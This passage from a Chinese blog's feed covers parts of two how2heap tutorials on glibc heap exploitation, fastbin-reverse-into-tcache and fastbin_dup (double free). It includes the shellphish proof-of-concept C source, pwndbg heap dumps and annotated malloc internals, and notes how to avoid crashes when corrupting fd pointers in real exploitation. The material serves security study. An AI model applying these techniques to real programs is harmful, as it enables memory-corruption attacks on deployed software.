class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x555555757440</span> —▸ <span class="number">0x5555557573f0</span> —▸ <span class="number">0x5555557573a0</span> —▸ <span class="number">0x555555757350</span> —▸ <span class="number">0x555555757300</span> —▸ <span class="number">0x5555557572b0</span> —▸ <span class="number">0x555555757260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x555555757480</span> ◂— <span class="number">0x0</span></span><br><span class="line">      <span class="meta">#victim</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h2 id="避免触发程序的段错误"><a href="#避免触发程序的段错误" class="headerlink" title="避免触发程序的段错误"></a>避免触发程序的段错误</h2><p>接下来是重点，因为此处处理不好会触发程序的段错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">  <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">  <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">  <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">  <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123; <span class="comment">//接下来我们释放堆块以填充fastbin</span></span><br><span class="line">  <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的注释看不懂没关系，此处牵扯到的重点 malloc 源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line"> <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//判断tcache是否已满</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>) <span class="comment">//判断fastbin链表上是否仍有空闲的chunk</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd; <span class="comment">//单线程执行，对tc_victim开始解链</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">&#123; <span class="comment">//多线程执行</span></span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">     tcache_put (tc_victim, tc_idx); <span class="comment">//向tcachebin放入tc_victim</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="第一个例子"><a href="#第一个例子" class="headerlink" title="第一个例子"></a>第一个例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将原POC的53-56行改为如下内容：</span></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">9</span>; i++) &#123; <span class="comment">//这里发生变动</span></span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>编译完成之后引入 malloc 源码对代码 82 行下断点后进入调试：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619407394237-6a8c1201-8972-44fa-b3ab-b9bc59e823dc.png#clientId=u99c283f4-1188-4&from=drop&id=j8R4G&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2011.23.08.png&originHeight=672&originWidth=2750&originalType=binary&size=90409&status=done&style=none&taskId=u53e86d77-f52f-4d6a-9e73-ebf6f3e8b60" alt="截屏2021-04-26 11.23.08.png"></p><blockquote><p>*(size_t**)victim = &amp;stack_var[0];</p></blockquote><p>可以看到 victim 已经挂上了 fastbin 链表中，将 tcachebin 清空后效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619407728260-6e960219-69a6-4acb-8d4e-fad28b5f9aa9.png#clientId=u99c283f4-1188-4&from=drop&id=u6b9e259e&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2011.28.44.png&originHeight=668&originWidth=2748&originalType=binary&size=81047&status=done&style=none&taskId=u43b4d840-04b3-44da-b1be-b2934f6ae3f" alt="截屏2021-04-26 11.28.44.png"><br>接下来我们单步步入 malloc(allocsize)，这里是我们研究的重点：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619425432909-4bc86d6f-2f97-401b-a800-a868a24cd1f2.png#clientId=u171698b9-8ed7-4&from=drop&id=u1588a79e&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2016.23.14.png&originHeight=1800&originWidth=2880&originalType=binary&size=420742&status=done&style=none&taskId=u679ac348-3dfa-4a66-bfdf-ac660a594a3" alt="截屏2021-04-26 16.23.14.png"><br>如上图所示，victim（这里指的是 0x5555557574d0 而不是 0x7fffffffdd40）已经从 fastbin 中解链，现在就要进行对余下的 free chunk 进行整理，第一次整理之后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619425747206-b8da5d1f-ad13-43c9-a587-3cc2003c20e3.png#clientId=u171698b9-8ed7-4&from=drop&id=u67efcd82&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2016.28.40.png&originHeight=1800&originWidth=2880&originalType=binary&size=419119&status=done&style=none&taskId=uc84a6597-5537-4425-9e59-890578683c2" alt="截屏2021-04-26 16.28.40.png"><br>第二次整理后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619425829569-0a81e975-38db-4428-94f8-a77153bb013a.png#clientId=u171698b9-8ed7-4&from=drop&id=u827bd7a6&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2016.29.48.png&originHeight=1800&originWidth=2880&originalType=binary&size=408102&status=done&style=none&taskId=u83b297d2-2780-45ea-9896-2a4c848132a" alt="截屏2021-04-26 16.29.48.png"><br>看一下上面的图，从 fastbin 链表中可以知道 0xcdcdcdcdcdcdcdcd 被当作一个堆块链入，主要看会造成段错误的地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line"> <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//判断tcache是否已满</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>) <span class="comment">//判断fastbin链表上是否仍有空闲的chunk</span></span><br><span class="line">   &#123; <span class="comment">//进入if语句</span></span><br><span class="line">     <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd; <span class="comment">//单线程执行，对tc_victim开始解链</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">&#123; <span class="comment">//多线程执行</span></span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">     tcache_put (tc_victim, tc_idx); <span class="comment">//向tcachebin放入tc_victim</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619426045692-ff06ac77-e056-467d-8d9a-d657b0946828.png#clientId=u171698b9-8ed7-4&from=drop&id=ua5817191&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2016.33.58.png&originHeight=1180&originWidth=2752&originalType=binary&size=255124&status=done&style=none&taskId=ua0748e4e-e510-4d16-af3f-6702653e2f0" alt="截屏2021-04-26 16.33.58.png"><br>如上图所示，由于 tc_victim 是一个无效的地址，因此在执行*fb = tc_victim-&gt;fd;会直接崩溃：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619426129541-094af4a3-48b5-46d9-8260-2e5543331045.png#clientId=u171698b9-8ed7-4&from=drop&id=u1f20f843&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2016.35.22.png&originHeight=1800&originWidth=2880&originalType=binary&size=498926&status=done&style=none&taskId=uf733a066-b682-4b47-b1fe-a343f0daaa4" alt="截屏2021-04-26 16.35.22.png"></p><h3 id="第二个例子"><a href="#第二个例子" class="headerlink" title="第二个例子"></a>第二个例子</h3><p>现在我们将代码更改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//......</span></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">9</span>; i++) &#123; <span class="comment">//更改这里</span></span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(stack_var)); <span class="comment">//更改这里</span></span><br><span class="line"> <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后我们再来看看程序是否仍会崩溃（对 118 行下断点调试），来到之前崩溃的地方：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619427038923-af9baf96-cec1-417f-b72d-7932c19bd220.png#clientId=u171698b9-8ed7-4&from=drop&id=u04dcf390&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2016.50.27.png&originHeight=1800&originWidth=2880&originalType=binary&size=392768&status=done&style=none&taskId=ua1e57bb8-4ead-4d8c-80ae-567adc9c5a1" alt="截屏2021-04-26 16.50.27.png"><br>仔细观察，这里 fastbin 链表和之前的并不一样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x7fffffffdd40</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x7fffffffdd40</span> -&gt; <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>继续：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619427267249-d71575df-61b8-4d05-8878-c4ac332d2d49.png#clientId=u171698b9-8ed7-4&from=drop&id=u58afdbc1&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-26%2016.54.21.png&originHeight=670&originWidth=2750&originalType=binary&size=80671&status=done&style=none&taskId=u48b3739e-5220-4537-9c23-746452088c4" alt="截屏2021-04-26 16.54.21.png"><br>由于 0x7fffffffdd40 栈上的地址为空，因此 fastbin 到这里就会结束而不是继续向其中放入堆块或崩溃：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line"> <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)  <span class="comment">//fastbin链上为空，不会再次进入此循环</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">&#123; <span class="comment">//多线程执行</span></span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">     tcache_put (tc_victim, tc_idx);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="利用方式（总结）"><a href="#利用方式（总结）" class="headerlink" title="利用方式（总结）"></a>利用方式（总结）</h1><p>当我们利用 UAF 或堆溢出修改某一个 fastbin 堆块的 fd 指针指向某一个想要可控的地址后（之后我们称之为 victim），malloc 管理器会自动认为 victim 被释放到 fastbin 中，因此在实战过程中要注意 victim 地址处的内容是否为空，因为这将决定程序是否崩溃。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(1)-fastbin_dup(fastbin double free)</title>
    <link href="https://cyberangel.cn/2021/04/19/how2heap(1)-fastbin_dup(fastbin%20double%20free)/"/>
    <id>https://cyberangel.cn/2021/04/19/how2heap(1)-fastbin_dup(fastbin%20double%20free)/</id>
    <published>2021-04-19T11:36:51.000Z</published>
    <updated>2021-07-04T09:57:12.321Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从这一小节开始我们开始讲述各类对堆的攻击方式，当然你可能有疑问在之前并没有了解过 free 的源码就怎么开始漏洞研究了呢？说的很对，虽然在我很早的文章中说明过一部分的漏洞以利用方式，但是并没有对漏洞成因进行深究；也就是说我们只知道“表面现象”而不知“深层次原因”。所以在之后讲述漏洞的篇章中都会对 free 源码进行讲解以更深的了解漏洞成因和防御措施。接下来我们转入正题。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在我很早的文章中说明过这个漏洞的成因–double free，相关文章链接如下：</p><blockquote><p>（现在看来之前写的文章简直是黑历史）</p></blockquote><p>当 heap 段中某一个堆块被进行二次释放就会在 bin 中形成 circular list（循环链表），严重会导致任意内存读写。</p><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>所有 glibc malloc 版本</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><blockquote><p>之后文章如若未有额外说明，则 POC 来自：<br><a href="https://github.com/shellphish/how2heap/tree/master/glibc_2.27">https://github.com/shellphish/how2heap/tree/master/glibc_2.27</a></p></blockquote><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>POC 可以测试系统中是否有此漏洞存在，如果不存在会触发 assert 断言</p></blockquote><p>POC 运行效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618833932458-f32b9dea-64b1-4b7f-a768-7c9669cb3806.png#clientId=uaeba69f1-0582-4&from=drop&id=u73045567&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-19%2020.05.26.png&originHeight=550&originWidth=2724&originalType=binary&size=154399&status=done&style=none&taskId=ue05d588e-689c-4297-8d42-fb01f131b31" alt="截屏2021-04-19 20.05.26.png"></p><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><blockquote><p>使用的编译命令：gcc -g fastbin_dup -o fastbin_dup</p></blockquote><p>我们主要分析 main 函数中的代码，首先来看第一部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码申请了 8 个大小为 8 的堆块，其指针返回到 void *ptr[8]中，然后释放前 7 个堆块，因为这里我们要演示的是 fastbin_dup，所以首先要释放 7 个填满 tcachebin：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1618834996719-66fcee1a-6ac1-4ddf-b8fd-ce4bd16db954.png#clientId=uaeba69f1-0582-4&from=drop&id=u8b46a113&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-19%2020.23.12.png&originHeight=1800&originWidth=2880&originalType=binary&size=377208&status=done&style=none&taskId=ue0927e6a-6e4c-4b1b-9bf1-0eff57ffbb7" alt="截屏2021-04-19 20.23.12.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">120</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000007</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757050</span>:<span class="number">0x0000555555757320</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index1(tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index2(tcachebin)</span><br><span class="line"><span class="number">0x555555757280</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index3(tcachebin)</span><br><span class="line"><span class="number">0x5555557572a0</span>:<span class="number">0x0000555555757280</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index4(tcachebin)</span><br><span class="line"><span class="number">0x5555557572c0</span>:<span class="number">0x00005555557572a0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index5(tcachebin)</span><br><span class="line"><span class="number">0x5555557572e0</span>:<span class="number">0x00005555557572c0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index6(tcachebin)</span><br><span class="line"><span class="number">0x555555757300</span>:<span class="number">0x00005555557572e0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index7(tcachebin)</span><br><span class="line"><span class="number">0x555555757320</span>:<span class="number">0x0000555555757300</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x555555757330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #index8(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020cb1</span></span><br><span class="line">......</span><br><span 